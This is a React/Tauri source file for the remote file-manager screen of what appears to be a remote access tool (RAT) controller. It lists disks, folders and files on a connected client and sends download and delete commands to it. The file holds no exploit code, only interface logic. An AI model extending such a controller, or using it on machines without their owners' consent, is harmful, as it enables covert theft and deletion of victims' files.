import { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";
import { FileType } from "../../types";
import { readFilesCmd, manageFileCmd } from "../rat/RATCommands";
import { listen } from "@tauri-apps/api/event";
import {
  IconFolderFilled,
  IconFileFilled,
  IconArrowLeft,
  IconDownload,
  IconTrash,
  IconFileTypeZip,
  IconFileBarcode,
  IconFileMusic,
  IconFileTypeTxt,
  IconFileTypePdf,
  IconFileTypePng,
  IconFileTypeDoc,
  IconFileTypeXls,
  IconFileTypePpt,
  IconFileCode,
} from "@tabler/icons-react";

let fileIcon = {
  dir: <IconFolderFilled size={24} />,
  file: <IconFileFilled size={24} />,
  back: <IconArrowLeft size={24} />,
};

export const FileManager = () => {
  const { addr } = useParams();

  const [path, setPath] = useState("");
  const [files, setFiles] = useState<Array<FileType> | null>(null);
  const [folderFilter, setFolderFilter] = useState("");
  const [fileFilter, setFileFilter] = useState("");

  const filesRef = useRef<HTMLDivElement>(null);
  const foldersRef = useRef<HTMLDivElement>(null);

  function fileActions(type: string, fileName: string) {
    if (type === "file")
      return (
        <div className="flex flex-row gap-2">
          <div
            className="tooltip break-words"
            data-tip="Download File"
            onClick={(e) => {
              e.stopPropagation();
              manageFile("download_file", fileName);
            }}
          >
            <button className="btn btn-sm btn-outline no-animation hover:bg-white hover:text-black">
              <IconDownload size={14} />
            </button>
          </div>

          <div
            className="tooltip break-words"
            data-tip="Delete File"
            onClick={() => manageFile("remove_file", fileName)}
          >
            <button className="btn btn-sm btn-outline btn-error no-animation">
              <IconTrash size={14} />
            </button>
          </div>
        </div>
      );
    return null;
  }

  useEffect(() => {
    fetchFolder("disks");
  }, []);

  useEffect(() => {
    let unlisten = listen("files_result", (event: any) => {
      if (event.payload.addr === addr) {
        setFiles(event.payload.files);
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, []);

  useEffect(() => {
    let unlisten = listen("current_folder", (event: any) => {
      if (event.payload.addr === addr) {
        setPath(event.payload.path);
        if (filesRef.current)
          filesRef.current.scrollIntoView({ behavior: "smooth" });
        if (foldersRef.current)
          foldersRef.current.scrollIntoView({ behavior: "smooth" });
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, []);

  async function fetchFolder(folder: string) {
    let run =
      folder === "previous"
        ? "previous_dir"
        : folder === "disks"
        ? "available_disks"
        : "view_dir";

    await readFilesCmd(addr, run, folder);
  }

  async function manageFile(command: string, fileName: string) {
    await manageFileCmd(addr, command, fileName);
  }

  function fileExtension(fileName: string) {
    if (
      fileName.includes(".rar") ||
      fileName.includes(".zip") ||
      fileName.includes(".7z")
    )
      return <IconFileTypeZip size={24} />;
    if (
      fileName.includes(".mp4") ||
      fileName.includes(".mkv") ||
      fileName.includes(".avi")
    )
      return <IconFileBarcode size={24} />;
    if (
      fileName.includes(".mp3") ||
      fileName.includes(".wav") ||
      fileName.includes(".flac")
    )
      return <IconFileMusic size={24} />;
    if (
      fileName.includes(".jpg") ||
      fileName.includes(".jpeg") ||
      fileName.includes(".png") ||
      fileName.includes(".gif")
    )
      return <IconFileTypePng size={24} />;
    if (fileName.includes(".txt")) return <IconFileTypeTxt size={24} />;
    if (fileName.includes(".pdf")) return <IconFileTypePdf size={24} />;
    if (fileName.includes(".doc") || fileName.includes(".docx"))
      return <IconFileTypeDoc size={24} />;
    if (fileName.includes(".xls") || fileName.includes(".xlsx"))
      return <IconFileTypeXls size={24} />;
    if (fileName.includes(".ppt") || fileName.includes(".pptx"))
      return <IconFileTypePpt size={24} />;
    if (
      fileName.includes(".html") ||
      fileName.includes(".css") ||
      fileName.includes(".js")
    )
      return <IconFileCode size={24} />;

    return <IconFileFilled size={24} />;
  }

  return (
    <div className="p-6 w-full h-screen bg-primarybg box-border overflow-hidden relative">
      <p className="text-2xl font-bold mb-4 text-white">
        Current path: <span className="text-base text-gray-400">{path}</span>
      </p>

      <div className="flex gap-4 w-full h-[calc(100vh-100px)]">
        {/* Folders Section */}
        <div className="w-[300px] bg-secondarybg p-4 rounded-xl overflow-y-auto h-full shadow-inner">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold text-white">Folders</h2>
            <label className="input input-sm flex items-center gap-1 bg-secondarybg text-white border border-accentx rounded-2xl max-w-[150px]">
              <input
                value={folderFilter}
                onChange={(e) => setFolderFilter(e.target.value)}
                type="text"
                className="grow text-xs"
                placeholder="Filter"
              />
            </label>
          </div>

          {/* Back button */}
          <div
            onClick={() => fetchFolder("previous")}
            className="flex items-center gap-3 cursor-pointer hover:bg-base-100 p-3 rounded-lg transition mb-3 bg-primarybg"
          >
            {fileIcon.back}
            <span className="text-base font-medium text-white">../</span>
          </div>

          {/* Folder list */}
          <div ref={foldersRef} className="space-y-3">
            {files
              ?.filter((f) => f.file_type === "dir")
              .filter(
                (f) =>
                  f.name !== "../" &&
                  f.name.toLowerCase().includes(folderFilter.toLowerCase())
              )
              .map((file) => (
                <div key={file.name}>
                  <div
                    className="flex items-center justify-between bg-primarybg hover:bg-base-100 transition p-3 rounded-lg cursor-pointer"
                    onClick={() => fetchFolder(file.name)}
                  >
                    <div className="flex items-center gap-2 w-full">
                      {fileIcon[file.file_type as keyof typeof fileIcon]}
                      <div className="tooltip break-words" data-tip={file.name}>
                        {file.name}
                      </div>
                    </div>

                    <div
                      className="tooltip break-words"
                      data-tip="Delete"
                      onClick={(e) => {
                        e.stopPropagation();
                        manageFile("remove_dir", file.name);
                      }}
                    >
                      <button className="btn btn-xs btn-outline btn-error no-animation">
                        <IconTrash size={14} />
                      </button>
                    </div>
                  </div>
                </div>
              ))}
          </div>
        </div>

        {/* Files Section */}
        <div
          ref={filesRef}
          className="flex-1 bg-secondarybg p-4 rounded-xl overflow-y-auto h-full shadow-inner"
        >
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold text-white">Files</h2>
            <label className="input input-sm flex items-center gap-1 bg-secondarybg text-white border border-accentx rounded-2xl max-w-[150px]">
              <input
                value={fileFilter}
                onChange={(e) => setFileFilter(e.target.value)}
                type="text"
                className="grow text-xs"
                placeholder="Filter"
              />
            </label>
          </div>

          <div className="grid grid-cols-[repeat(auto-fill,minmax(180px,1fr))] gap-4">
            {files
              ?.filter((f) => f.file_type === "file")
              .filter((f) =>
                f.name.toLowerCase().includes(fileFilter.toLowerCase())
              )
              .map((file) => (
                <div
                  key={file.name}
                  className="flex flex-col justify-between items-center p-4 bg-primarybg rounded-lg shadow hover:shadow-md transition"
                >
                  <div className="mb-3 text-white">
                    {fileExtension(file.name)}
                  </div>
                  <div
                    className="tooltip mb-4 break-words w-full"
                    data-tip={file.name}
                  >
                    <span
                      className={`${
                        file.name.length > 20
                          ? "w-full inline-block"
                          : "flex justify-center"
                      } text-ellipsis !overflow-hidden whitespace-nowrap px-2`}
                    >
                      {file.name}
                    </span>
                  </div>
                  {fileActions(file.file_type, file.name)}
                </div>
              ))}
          </div>
        </div>
      </div>
    </div>
  );
};
